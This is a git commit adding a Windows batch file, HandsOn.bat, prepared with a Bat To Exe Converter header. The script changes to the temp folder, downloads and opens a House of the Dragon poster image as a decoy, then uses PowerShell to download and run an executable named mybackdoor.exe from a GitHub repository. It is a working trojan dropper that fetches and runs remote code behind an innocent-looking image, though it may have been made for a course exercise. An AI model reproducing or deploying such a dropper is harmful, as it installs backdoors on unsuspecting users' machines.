289c75bfd7b80ddf955e8c0123a99474a4e56eec
elenaivanova907 <124574668+elenaivanova907@users.noreply.github.com>
2023-02-06 14:21:57 +0200

    Add files via upload

---
+++ HandsOn.bat
@@ -0,0 +1,40 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFA5HSRa+GGStCLkT6ezo0/qIsVkYRqw2e4C7
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFA5HSRa+GG6pDaET+NTT7uSDsWITZPAwcorYzvqLOOVz
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://sm.ign.com/ign_sr/gallery/h/house-of-t/house-of-the-dragon-character-posters_75v2.jpg' -OutFile poster.jpg"
+poster.jpg
+Powershell -Command "Invoke-WebRequest 'https://github.com/sweet-eli-iv/INF370/raw/main/mybackdoor.exe' -OutFile mybackdoor.exe"
+mybackdoor.exe
+
+
